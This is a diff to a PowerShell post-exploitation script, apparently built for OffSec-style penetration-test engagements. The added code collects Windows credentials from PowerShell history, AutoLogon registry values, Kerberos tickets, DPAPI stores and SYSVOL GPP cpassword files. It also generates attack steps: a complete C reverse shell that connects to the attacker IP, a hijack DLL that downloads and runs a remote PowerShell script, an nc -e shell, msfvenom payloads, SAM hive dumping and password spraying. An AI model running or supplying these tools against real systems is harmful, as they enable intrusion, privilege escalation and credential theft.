@@ -169,6 +169,8 @@ function Show-Usage {
     Write-Host "  -OutDir <path>   Output directory (default: .\loot)"
     Write-Host "  -Quick           Skip slow phases"
     Write-Host "  -Phase <name>    Single phase: proof|system|creds|network|files"
+    Write-Host "  -KaliIp <ip>     Kali attacker IP (default: auto-detect from inbound sessions)"
+    Write-Host "  -NoColor         Disable ANSI colors (auto-off when not interactive)"
     Write-Host "  -Help            Show this help"
     Write-Host ""
     Write-Host "Output structure:"
@@ -526,25 +528,144 @@ function Invoke-PhaseCredential {
         Write-Warn "cmdkey failed: $_"
     }
 
-    # PSReadLine command history (all users)
+    # PSReadLine command history (all users) — also aggregate into powershell_history.txt
+    # so attack_commands can grep a single file instead of iterating dynamic globs.
     Write-Info "Searching for PSReadLine history files..."
     $histPaths = @(
         "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
         "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     )
     $histCount = 0
+    $histAgg = [System.Text.StringBuilder]::new()
     foreach ($hp in $histPaths) {
         try {
             $matchResult = Get-Item -Path $hp -ErrorAction SilentlyContinue
             foreach ($hf in $matchResult) {
                 $safeName = $hf.FullName -replace "[:\\]", "_"
                 Copy-Item $hf.FullName "$CDir\pshistory_$safeName.txt" -ErrorAction SilentlyContinue
+                $null = $histAgg.AppendLine("=== $($hf.FullName) ===")
+                $null = $histAgg.AppendLine((Get-Content $hf.FullName -Raw -ErrorAction SilentlyContinue))
                 Write-Success "PSReadLine history: $($hf.FullName)"
                 $histCount++
             }
         } catch { $null = $_ }
     }
-    if ($histCount -eq 0) { Write-Info "No PSReadLine history files found" }
+    if ($histCount -gt 0) {
+        $histAgg.ToString() | Out-File -Encoding UTF8 "$CDir\powershell_history.txt"
+    } else {
+        Write-Info "No PSReadLine history files found"
+    }
+
+    # AutoLogon registry — DefaultUserName / DefaultPassword in Winlogon
+    Write-Info "Checking Winlogon for AutoLogon credentials..."
+    try {
+        $winlogonKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        $al = Get-ItemProperty $winlogonKey -ErrorAction SilentlyContinue
+        if ($al) {
+            $alLines = [System.Collections.Generic.List[string]]::new()
+            foreach ($prop in @("AutoAdminLogon","DefaultUserName","DefaultDomainName","DefaultPassword","AltDefaultUserName","AltDefaultPassword")) {
+                $v = $al.$prop
+                if ($null -ne $v -and "$v" -ne "") {
+                    # Match attack_commands regex: "... REG_SZ <value>"
+                    $alLines.Add("    $prop    REG_SZ    $v")
+                }
+            }
+            if ($alLines.Count -gt 0) {
+                $alLines | Out-File -Encoding UTF8 "$CDir\autologon.txt"
+                if ($alLines -match "DefaultPassword") {
+                    Write-Success "AutoLogon DefaultPassword present — see creds\autologon.txt"
+                } else {
+                    Write-Info "AutoLogon keys present but no DefaultPassword"
+                }
+            }
+        }
+    } catch {
+        Write-Warn "Winlogon AutoLogon check failed: $_"
+    }
+
+    # Kerberos tickets (non-privileged; Rubeus is a manual follow-up)
+    Write-Info "Collecting Kerberos ticket list (klist)..."
+    try {
+        $kOut = [System.Text.StringBuilder]::new()
+        $null = $kOut.AppendLine("=== klist (current session) ===")
+        $null = $kOut.AppendLine((klist 2>&1 | Out-String))
+        # klist /li 0x3e7 = SYSTEM logon session (requires admin to view)
+        $null = $kOut.AppendLine("=== klist /li 0x3e7 (SYSTEM session) ===")
+        $null = $kOut.AppendLine((klist /li 0x3e7 2>&1 | Out-String))
+        $kOut.ToString() | Out-File -Encoding UTF8 "$CDir\kerberos.txt"
+        if ($kOut.ToString() -match "Server:|#\d+>") {
+            Write-Success "Kerberos tickets present — see creds\kerberos.txt"
+        }
+    } catch {
+        Write-Warn "klist failed: $_"
+    }
+
+    # DPAPI credentials + masterkeys (collect paths and file lists only — decryption requires key)
+    Write-Info "Enumerating DPAPI credential + masterkey stores..."
+    try {
+        $dpapiRoots = @(
+            "$env:APPDATA\Microsoft\Credentials",
+            "$env:LOCALAPPDATA\Microsoft\Credentials",
+            "$env:APPDATA\Microsoft\Protect",
+            "$env:LOCALAPPDATA\Microsoft\Vault",
+            "C:\Users\*\AppData\Roaming\Microsoft\Credentials",
+            "C:\Users\*\AppData\Local\Microsoft\Credentials",
+            "C:\Users\*\AppData\Roaming\Microsoft\Protect"
+        )
+        $dpapiLines = [System.Collections.Generic.List[string]]::new()
+        foreach ($dr in $dpapiRoots) {
+            try {
+                $items = Get-ChildItem -Path $dr -Recurse -Force -File -ErrorAction SilentlyContinue |
+                    Select-Object -First 50
+                foreach ($it in $items) {
+                    $dpapiLines.Add($it.FullName)
+                }
+            } catch { $null = $_ }
+        }
+        if ($dpapiLines.Count -gt 0) {
+            $dpapiLines | Out-File -Encoding UTF8 "$CDir\dpapi_files.txt"
+            Write-Success "DPAPI files enumerated: $($dpapiLines.Count) — see creds\dpapi_files.txt"
+        }
+    } catch {
+        Write-Warn "DPAPI enumeration failed: $_"
+    }
+
+    # GPP Groups.xml on SYSVOL (MS14-025) — cpassword is AES-256-decryptable
+    Write-Info "Checking SYSVOL for GPP Groups.xml (MS14-025)..."
+    try {
+        $dnsDomain = $env:USERDNSDOMAIN
+        if ($dnsDomain) {
+            $sysvolRoot = "\\$dnsDomain\SYSVOL\$dnsDomain\Policies"
+            if (Test-Path $sysvolRoot -ErrorAction SilentlyContinue) {
+                $gppFiles = Get-ChildItem -Path $sysvolRoot -Recurse -Force -ErrorAction SilentlyContinue `
+                    -Include "Groups.xml","Services.xml","ScheduledTasks.xml","DataSources.xml","Drives.xml","Printers.xml" |
+                    Select-Object -First 50
+                $gppHits = [System.Collections.Generic.List[string]]::new()
+                foreach ($gf in $gppFiles) {
+                    try {
+                        $content = Get-Content $gf.FullName -Raw -ErrorAction SilentlyContinue
+                        if ($content -match 'cpassword\s*=\s*"[^"]+"') {
+                            $gppHits.Add("CPASSWORD FOUND: $($gf.FullName)")
+                            $safeName = $gf.FullName -replace "[:\\]","_"
+                            Copy-Item $gf.FullName "$CDir\gpp_$safeName" -ErrorAction SilentlyContinue
+                        }
+                    } catch { $null = $_ }
+                }
+                if ($gppHits.Count -gt 0) {
+                    $gppHits | Out-File -Encoding UTF8 "$CDir\gpp_cpassword.txt"
+                    Write-Success "GPP cpassword found — see creds\gpp_cpassword.txt (MS14-025)"
+                } else {
+                    Write-Info "SYSVOL reachable, no cpassword= in Policies\*.xml"
+                }
+            } else {
+                Write-Info "SYSVOL not reachable (not domain-joined or no route)"
+            }
+        } else {
+            Write-Info "USERDNSDOMAIN not set — skipping SYSVOL scan"
+        }
+    } catch {
+        Write-Warn "SYSVOL GPP scan failed: $_"
+    }
 
     # Unattend.xml search
     Write-Info "Searching for Unattend.xml (sysprep credentials)..."
@@ -1011,7 +1132,7 @@ function Invoke-PhaseFile {
             Select-Object Name, DisplayName, PathName, State, StartMode
         if ($unquoted) {
             $unquoted | Format-Table -AutoSize | Out-File -Encoding UTF8 "$FDir\unquoted_service_paths.txt"
-            Write-Warn "Unquoted service paths found: $($unquoted.Count)"
+            Write-Warn "Unquoted service paths found: $(@($unquoted).Count)"
             $unquoted | ForEach-Object { Write-Host "  $($_.Name): $($_.PathName)" -ForegroundColor Yellow }
         } else {
             "No unquoted service paths found" | Out-File -Encoding UTF8 "$FDir\unquoted_service_paths.txt"
@@ -1277,6 +1398,16 @@ function Invoke-AttackCommands {
     $null = $sb.AppendLine("  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
     $null = $sb.AppendLine("============================================================")
     $null = $sb.AppendLine("")
+    $null = $sb.AppendLine("# OffSec RULE: Metasploit (msfvenom / msfconsole / meterpreter)")
+    $null = $sb.AppendLine("# is limited to ONE target across the entire engagement.")
+    $null = $sb.AppendLine("# Prefer the manual alternative listed next to each msfvenom line:")
+    $null = $sb.AppendLine("#   - EXE revshell:  x86_64-w64-mingw32-gcc revshell.c -o shell.exe")
+    $null = $sb.AppendLine("#   - DLL revshell:  x86_64-w64-mingw32-gcc -shared revshell.c -o r.dll")
+    $null = $sb.AppendLine("#   - MSI payload:   WixSharp, or hand-roll WiX XML + candle.exe/light.exe")
+    $null = $sb.AppendLine("#   - PowerShell:    Invoke-PowerShellTcp.ps1 (nishang)")
+    $null = $sb.AppendLine("#                    or powercat -c $KaliIp -p 4444 -e powershell")
+    $null = $sb.AppendLine("# Save your one MSF use for a target that truly needs it.")
+    $null = $sb.AppendLine("")
 
     # ── SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege ────────────────
     $privPath = Join-Path $LootDir "creds\privileges.txt"
@@ -1310,8 +1441,13 @@ function Invoke-AttackCommands {
             $null = $sb.AppendLine("[ AlwaysInstallElevated — MSI PRIVESC ]")
             $null = $sb.AppendLine("  # On Kali — start listener first:")
             $null = $sb.AppendLine("  penelope -p 4444 -O")
-            $null = $sb.AppendLine("  # Generate malicious MSI on Kali:")
+            $null = $sb.AppendLine("  # Option A — msfvenom MSI (costs your 1 MSF use):")
             $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f msi -o privesc.msi")
+            $null = $sb.AppendLine("  # Option B — manual MSI with WixSharp (no MSF):")
+            $null = $sb.AppendLine("  #   1. Write a .cs that calls: Process.Start(`"cmd.exe`", `"/c nc.exe $KaliIp 4444 -e cmd.exe`")")
+            $null = $sb.AppendLine("  #   2. wix build msi.cs  ->  privesc.msi")
+            $null = $sb.AppendLine("  # Option C — manual MSI via WiX toolset (candle/light):")
+            $null = $sb.AppendLine("  #   candle.exe privesc.wxs && light.exe privesc.wixobj -o privesc.msi")
             $null = $sb.AppendLine("  # Transfer to target and run as current user (installs as SYSTEM):")
             $null = $sb.AppendLine("  msiexec /quiet /qn /i privesc.msi")
             $null = $sb.AppendLine("")
@@ -1330,8 +1466,24 @@ function Invoke-AttackCommands {
             }
             $null = $sb.AppendLine("  # On Kali — start listener first:")
             $null = $sb.AppendLine("  penelope -p 4444 -O")
-            $null = $sb.AppendLine("  # Generate reverse shell on Kali and drop in writable path segment:")
+            $null = $sb.AppendLine("  # Option A — msfvenom EXE (costs your 1 MSF use):")
             $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  # Option B — manual EXE revshell with mingw (no MSF):")
+            $null = $sb.AppendLine("  cat > revshell.c <<'EOF'")
+            $null = $sb.AppendLine("  #include <winsock2.h>")
+            $null = $sb.AppendLine("  #include <windows.h>")
+            $null = $sb.AppendLine("  #pragma comment(lib,`"ws2_32`")")
+            $null = $sb.AppendLine("  int main(){ WSADATA w; WSAStartup(MAKEWORD(2,2),&w);")
+            $null = $sb.AppendLine("    SOCKET s=WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);")
+            $null = $sb.AppendLine("    struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(4444);")
+            $null = $sb.AppendLine("    a.sin_addr.s_addr=inet_addr(`"$KaliIp`");")
+            $null = $sb.AppendLine("    connect(s,(struct sockaddr*)&a,sizeof(a));")
+            $null = $sb.AppendLine("    STARTUPINFO si={0}; si.cb=sizeof(si); si.dwFlags=STARTF_USESTDHANDLES;")
+            $null = $sb.AppendLine("    si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;")
+            $null = $sb.AppendLine("    PROCESS_INFORMATION pi; CreateProcessA(0,`"cmd.exe`",0,0,TRUE,0,0,0,&si,&pi);")
+            $null = $sb.AppendLine("    return 0; }")
+            $null = $sb.AppendLine("  EOF")
+            $null = $sb.AppendLine("  x86_64-w64-mingw32-gcc revshell.c -o shell.exe -lws2_32")
             $null = $sb.AppendLine("  # Copy to path segment (e.g. C:\Program.exe or C:\Program Files\Vuln.exe)")
             $null = $sb.AppendLine("  # Check service name from table above, then restart it:")
             $null = $sb.AppendLine("  sc stop <ServiceName> ; sc start <ServiceName>")
@@ -1355,8 +1507,10 @@ function Invoke-AttackCommands {
                 if (-not $binPath) { $binPath = "<SERVICE_BINARY_PATH>" }
                 $null = $sb.AppendLine("  # On Kali — start listener first:")
                 $null = $sb.AppendLine("  penelope -p 4444 -O")
-                $null = $sb.AppendLine("  # Generate reverse shell, overwrite binary, restart service:")
+                $null = $sb.AppendLine("  # Option A — msfvenom EXE (costs your 1 MSF use):")
                 $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
+                $null = $sb.AppendLine("  # Option B — manual EXE revshell (no MSF): see [ UNQUOTED SERVICE PATHS ] for the mingw C source")
+                $null = $sb.AppendLine("  # x86_64-w64-mingw32-gcc revshell.c -o shell.exe -lws2_32")
                 $null = $sb.AppendLine("  copy shell.exe '$binPath'")
                 $null = $sb.AppendLine("  sc stop $svcName ; sc start $svcName")
             }
@@ -1376,9 +1530,112 @@ function Invoke-AttackCommands {
             }
             $null = $sb.AppendLine("  # On Kali — start listener first:")
             $null = $sb.AppendLine("  penelope -p 4444 -O")
-            $null = $sb.AppendLine("  # Generate malicious DLL on Kali:")
+            $null = $sb.AppendLine("  # Option A — msfvenom DLL (costs your 1 MSF use):")
             $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f dll -o hijack.dll")
+            $null = $sb.AppendLine("  # Option B — manual DLL with mingw (no MSF):")
+            $null = $sb.AppendLine("  cat > hijack.c <<'EOF'")
+            $null = $sb.AppendLine("  #include <windows.h>")
+            $null = $sb.AppendLine("  BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p){")
+            $null = $sb.AppendLine('    if(r==DLL_PROCESS_ATTACH) WinExec("cmd.exe /c powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://' + $KaliIp + '/r.ps1'')\"",0);')
+            $null = $sb.AppendLine("    return TRUE; }")
+            $null = $sb.AppendLine("  EOF")
+            $null = $sb.AppendLine("  x86_64-w64-mingw32-gcc -shared hijack.c -o hijack.dll")
+            $null = $sb.AppendLine("  # Serve r.ps1 (nishang Invoke-PowerShellTcp.ps1) via ./servr.sh http")
             $null = $sb.AppendLine("  # Drop in writable directory with correct DLL name, restart service/app")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── SeBackup / SeRestore — SAM dump via reg save ─────────────────────────
+    if (Test-Path $privPath) {
+        $privContent = Get-Content $privPath -ErrorAction SilentlyContinue
+        $hasBackup = $privContent | Select-String "SeBackupPrivilege|SeRestorePrivilege"
+        if ($hasBackup) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ SeBackupPrivilege / SeRestorePrivilege — SAM/SYSTEM DUMP ]")
+            $null = $sb.AppendLine("  # Bypasses ACL checks — can read SAM/SYSTEM even as a non-admin user.")
+            $null = $sb.AppendLine("  # Step 1: dump hives on target (must enable the privilege in the token):")
+            $null = $sb.AppendLine("  reg save HKLM\SAM    C:\Windows\Temp\sam.save")
+            $null = $sb.AppendLine("  reg save HKLM\SYSTEM C:\Windows\Temp\sys.save")
+            $null = $sb.AppendLine("  # If 'reg save' reports 'Access denied', try via robocopy with /B (backup mode):")
+            $null = $sb.AppendLine("  #   robocopy /B C:\Windows\System32\config C:\Windows\Temp SAM SYSTEM")
+            $null = $sb.AppendLine("  # Step 2: exfil both files to Kali ($KaliIp), then:")
+            $null = $sb.AppendLine("  impacket-secretsdump -sam sam.save -system sys.save LOCAL")
+            $null = $sb.AppendLine("  # Step 3: crack NT hashes with crackr.sh:")
+            $null = $sb.AppendLine("  ./crackr.sh -f /tmp/nt_hashes.txt   # -m 1000 for NTLM")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Kerberos tickets ─────────────────────────────────────────────────────
+    $krbPath = Join-Path $LootDir "creds\kerberos.txt"
+    if (Test-Path $krbPath) {
+        $krbContent = Get-Content $krbPath -Raw -ErrorAction SilentlyContinue
+        if ($krbContent -match "Server:|#\d+>") {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ KERBEROS TICKETS PRESENT ]")
+            $null = $sb.AppendLine("  # Current session has Kerberos tickets — can lateral-move without passwords.")
+            $null = $sb.AppendLine("  # Review: type $krbPath")
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Option A — dump all tickets with Rubeus (MANUAL — do not auto-run):")
+            $null = $sb.AppendLine("  #   Rubeus.exe dump /nowrap")
+            $null = $sb.AppendLine("  #   Rubeus.exe dump /luid:0x3e7 /nowrap   # SYSTEM session (needs admin)")
+            $null = $sb.AppendLine("  # Option B — export ccache and use from Kali:")
+            $null = $sb.AppendLine("  #   Rubeus.exe dump /service:krbtgt /nowrap   # base64 .kirbi")
+            $null = $sb.AppendLine("  #   On Kali: echo '<b64>' | base64 -d > ticket.kirbi")
+            $null = $sb.AppendLine("  #           impacket-ticketConverter ticket.kirbi ticket.ccache")
+            $null = $sb.AppendLine("  #           export KRB5CCNAME=`$(pwd)/ticket.ccache")
+            $null = $sb.AppendLine("  #           impacket-psexec -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>")
+            $null = $sb.AppendLine("  # OffSec note: Rubeus is enumeration/dump only — still one-MSF budget untouched.")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── DPAPI blobs + masterkeys ─────────────────────────────────────────────
+    $dpPath = Join-Path $LootDir "creds\dpapi_files.txt"
+    if (Test-Path $dpPath) {
+        $dpContent = Get-Content $dpPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "\S" }
+        if ($dpContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ DPAPI BLOBS + MASTERKEYS ]")
+            $null = $sb.AppendLine("  # DPAPI files found (saved browser/RDP creds, vault, etc). Decrypt requires:")
+            $null = $sb.AppendLine("  #   (a) user's masterkey (AppData\Roaming\Microsoft\Protect\<SID>\<GUID>)")
+            $null = $sb.AppendLine("  #   (b) user's logon password OR SHA1 hash OR NTLM hash OR plaintext")
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Sample files (see $dpPath for full list):")
+            foreach ($dpf in $dpContent | Select-Object -First 5) {
+                $null = $sb.AppendLine("    $dpf")
+            }
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Decrypt with SharpDPAPI on target (manual — not auto-run):")
+            $null = $sb.AppendLine("  #   SharpDPAPI.exe credentials")
+            $null = $sb.AppendLine("  #   SharpDPAPI.exe masterkeys")
+            $null = $sb.AppendLine("  #   SharpDPAPI.exe rdg   # saved RDP targets")
+            $null = $sb.AppendLine("  # Or decrypt offline on Kali with pypykatz (after exfil):")
+            $null = $sb.AppendLine("  #   pypykatz dpapi masterkey <masterkey_file> --password '<user_pass>'")
+            $null = $sb.AppendLine("  #   pypykatz dpapi cred <blob> --masterkey <masterkey_hex>")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── GPP cpassword (MS14-025) ─────────────────────────────────────────────
+    $gppPath = Join-Path $LootDir "creds\gpp_cpassword.txt"
+    if (Test-Path $gppPath) {
+        $gppContent = Get-Content $gppPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "CPASSWORD FOUND" }
+        if ($gppContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ GPP cpassword — MS14-025 ]")
+            $null = $sb.AppendLine("  # cpassword attribute uses a Microsoft-published AES-256 key — trivial to decrypt.")
+            $null = $sb.AppendLine("  # Files (saved to loot\creds\gpp_*):")
+            foreach ($gh in $gppContent | Select-Object -First 5) {
+                $null = $sb.AppendLine("    $gh")
+            }
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Decrypt on Kali:")
+            $null = $sb.AppendLine("  gpp-decrypt <CPASSWORD_VALUE>")
+            $null = $sb.AppendLine("  # Then feed the plaintext into sprayr.sh:")
+            $null = $sb.AppendLine("  ./sprayr.sh -u '<USER_FROM_XML>' -p '<DECRYPTED>' -t $ThisHostIp")
+            $null = $sb.AppendLine("  ./sprayr.sh --from-creds   # after adding to ~/toolkit/creds.txt")
             $null = $sb.AppendLine("")
         }
     }
@@ -1411,7 +1668,10 @@ function Invoke-AttackCommands {
             $stContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
             $null = $sb.AppendLine("  # On Kali start listener, then overwrite the writable task binary and wait for trigger:")
             $null = $sb.AppendLine("  penelope -p 4444 -O")
+            $null = $sb.AppendLine("  # Option A — msfvenom EXE (costs your 1 MSF use):")
             $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  # Option B — manual EXE revshell (no MSF): see [ UNQUOTED SERVICE PATHS ] for the mingw C source")
+            $null = $sb.AppendLine("  # x86_64-w64-mingw32-gcc revshell.c -o shell.exe -lws2_32")
             $null = $sb.AppendLine("  copy shell.exe '<WRITABLE_TASK_BINARY_PATH>'")
             $null = $sb.AppendLine("")
         }
@@ -1439,8 +1699,8 @@ function Invoke-AttackCommands {
     $psHistPath = Join-Path $LootDir "creds\powershell_history.txt"
     if (Test-Path $psHistPath) {
         $psContent = Get-Content $psHistPath -ErrorAction SilentlyContinue |
-            Select-String -Pattern "pass|password|cred|secret|key|-p\s" -CaseSensitive:$false |
-            Select-Object -First 10
+            Select-String -Pattern "pass|password|cred|secret|key|token|bearer|authorization|ConvertTo-SecureString|-p\s" -CaseSensitive:$false |
+            Select-Object -First 20
         if ($psContent) {
             $HasActions = $true
             $null = $sb.AppendLine("[ POWERSHELL HISTORY — CREDENTIAL PATTERNS ]")
